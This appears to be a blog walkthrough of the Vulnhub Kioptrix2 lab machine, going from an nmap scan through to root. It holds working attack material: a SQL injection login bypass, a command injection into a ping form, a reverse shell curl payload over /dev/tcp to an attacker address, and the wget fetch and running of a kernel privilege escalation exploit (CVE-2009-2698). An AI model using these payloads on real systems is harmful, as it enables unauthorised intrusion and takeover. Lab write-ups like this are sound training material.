---
title: Vulnhub Kioptrix2 Walkthrough
categories:
- Vulnhub
tags: []
image:
  path: "/assets/images/kioptrix2/kio2.png"
  alt: Kioptrix2
---

# Recon
## Nmap

Running `nmap` on the box ip reveals `6` open ports :

```bash

nmap -sC -sV -p- 192.168.1.21 --min-rate 10000 

Nmap scan report for 192.168.1.21 (192.168.1.21)
Host is up (0.38s latency).

PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 3.9p1 (protocol 1.99)
80/tcp   open  http     Apache httpd 2.0.52 ((CentOS))
111/tcp  open  rpcbind  2 (RPC #100000)
443/tcp  open  ssl/http Apache httpd 2.0.52 ((CentOS))
631/tcp  open  ipp      CUPS 1.1
|_http-title: 403 Forbidden
| http-methods: 
|_  Potentially risky methods: PUT
|_http-server-header: CUPS/1.1
3306/tcp open  mysql    MySQL (unauthorized)

```

I'll sort them :

* `80`   http 
* `22`   ssh      
* `111`   rpcbind  
* `443`   ssl/http Apache httpd 2.0.52 ((CentOS))
* `631`    ipp      CUPS 1.1
* `3306`  mysql

## Port 80
Navigating to port 80 we see a login panel , my first hunch is to bypass the authentication and one way to do that is by sql injection :

Throwing a simple payload like `admin ' and 1=1 -- -` lead us to bypass the authetication and land on an Administrative Web Console where you can use ping command .


### Remote Code Execution
Seeing the ping command , our first try is to see if we can abuse that fonctionnality to run other commands by appending it to `ping` .

by typing this in the box : `127.0.0.1;id`

we got code execution :

```bash

127.0.0.1;id
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=0 ttl=64 time=0.090 ms
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.072 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.087 ms

--- 127.0.0.1 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 1999ms
rtt min/avg/max/mdev = 0.072/0.083/0.090/0.007 ms, pipe 2
uid=48(apache) gid=48(apache) groups=48(apache)
```
we can use curl to view the output clearly :


```bash

curl -s -k -X 'POST' -H 'Host: 192.168.5.254' --data-binary 'ip=127.0.0.1;id&submit=submit' 'http://192.168.5.254/pingit.php'
127.0.0.1;id<pre>PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=0 ttl=64 time=0.064 ms
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.041 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.044 ms

--- 127.0.0.1 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 1999ms
rtt min/avg/max/mdev = 0.041/0.049/0.064/0.013 ms, pipe 2
uid=48(apache) gid=48(apache) groups=48(apache)

```
## Shell as Apache 

we run our last `curl `command but this time i use a reverse shell instead of `id` command 

```bash
 ⚡ root@kali  ~  curl -s -k -X 'POST' -H 'Host: 192.168.5.254' --data-binary 'ip=127.0.0.1;bash+-i+>%26+/dev/tcp/192.168.5.214/4444+0>%261&submit=submit' 'http://192.168.5.254/pingit.php'


```
And on another tab i launch `nc` :

```bash

 ⚡ root@kali  ~  nc -lvp 4444                                            
listening on [any] 4444 ...
192.168.5.254: inverse host lookup failed: Unknown host
connect to [192.168.5.214] from (UNKNOWN) [192.168.5.254] 32769
bash: no job control in this shell
bash-3.00$ 


```
I'll use my upgrade my shell commands :

```bash

python -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm-256color
export PATH=/usr/local/sbin:/usr/local/bin:/usr/bin:/usr/sbin:/sbin:/bin:/usr/games:/tmp
alias ll='clear;ls -lsaht --color=auto'
Ctrl+z

stty raw -echo ;fg;reset 
stty columns 200 rows 116

```

## Privesc 
We will use a kernel exploit to privesc to `root` , because other methods to privesc didn't yields any results 

we use those three commands to get the kernel and exact OS version : it's a `Centos 4.5` with `kernel 2.6.9-55 ` linux

```bash

bash-3.00$ file /bin/bash
/bin/bash: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), for GNU/Linux 2.2.5, dynamically linked (uses shared libs), stripped

bash-3.00$ cat /etc/*-release 
CentOS release 4.5 (Final)

bash-3.00$ uname -a
Linux kioptrix.level2 2.6.9-55.EL #1 Wed May 2 13:52:16 EDT 2007 i686 i686 i386 GNU/Linux

```
Using `searchsploit` we got a match : 

```bash
searchsploit linux kernel 2 centos 4.5 local
------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                       |  Path
------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Linux Kernel 2.4/2.6 (RedHat Linux 9 / Fedora Core 4 < 11 / Whitebox 4 / CentOS 4) - 'sock_sendpage()' Ring0 Privilege Escalation (5 | linux/local/9479.c
Linux Kernel 2.6 < 2.6.19 (White Box 4 / CentOS 4.4/4.5 / Fedora Core 4/5/6 x86) - 'ip_append_data()' Ring0 Privilege Escalation (1) | linux_x86/local/9542.c
Linux Kernel 3.14.5 (CentOS 7 / RHEL) - 'libfutex' Local Privilege Escalation                                                        | linux/local/35370.c
------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```

I will copy it to my working directory 

```bash
searchsploit -m linux_x86/local/9542.c                       
  Exploit: Linux Kernel 2.6 < 2.6.19 (White Box 4 / CentOS 4.4/4.5 / Fedora Core 4/5/6 x86) - 'ip_append_data()' Ring0 Privilege Escalation (1)
      URL: https://www.exploit-db.com/exploits/9542
     Path: /usr/share/exploitdb/exploits/linux_x86/local/9542.c
    Codes: CVE-2009-2698
 Verified: True
File Type: C source, ASCII text
Copied to: /oscp/Vulnhub/kioptrix2/9542.c


```

and use `updog ` to launch an Http server for transfer , and on the box i use `wget` to get the file 

```bash

bash-3.00$ wget http://192.168.1.20:9090/9542.c
--14:38:12--  http://192.168.1.20:9090/9542.c
           => `9542.c'
Connecting to 192.168.1.20:9090... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2,535 (2.5K) [text/x-csrc]

 0% [                                                                                                                                                             ] 0  100%[============================================================================================================================================================>] 2,535         --.--K/s             

14:38:12 (2.92 MB/s) - `9542.c' saved [2535/2535]


```
I'll run `gcc ` to compile it  and lo and behold we are `root `:

```bash
bash-3.00$ gcc 9542.c -o 9542
9542.c:109:28: warning: no newline at end of file
bash-3.00$ ls
9542  9542.c
bash-3.00$ ./9542
sh-3.00# id
uid=0(root) gid=0(root) groups=48(apache)
sh-3.00# 


```
